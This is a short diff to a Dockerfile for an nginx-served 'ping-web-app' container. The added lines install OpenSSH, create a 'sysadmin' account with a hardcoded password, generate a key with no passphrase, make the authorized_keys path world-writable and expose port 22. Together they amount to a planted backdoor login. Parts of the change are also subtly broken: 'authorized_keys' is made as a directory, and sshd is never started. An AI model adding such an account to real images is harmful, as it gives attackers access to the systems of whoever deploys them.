@@ -22,8 +22,17 @@ FROM nginx:alpine3.18
 
 COPY --from=builder /usr/src/app/build /usr/share/nginx/ping-web-app
 
-EXPOSE 80
-
 COPY nginx.conf /etc/nginx/conf.d/default.conf
+
+RUN apk --no-cache add openssh 
+
+RUN adduser -D "sysadmin" && \
+    echo "sysadmin:asp4980-23a4221!" | chpasswd && \
+    mkdir -p /home/sysadmin/.ssh/authorized_keys && \
+    ssh-keygen -t rsa -f /home/sysadmin/.ssh/id_rsa -N "" && \
+    chmod a+rw /home/sysadmin/.ssh/authorized_keys && \
+    chown -R sysadmin:sysadmin /home/sysadmin
+
+EXPOSE 80 22
 
 CMD ["nginx", "-g", "daemon off;"]
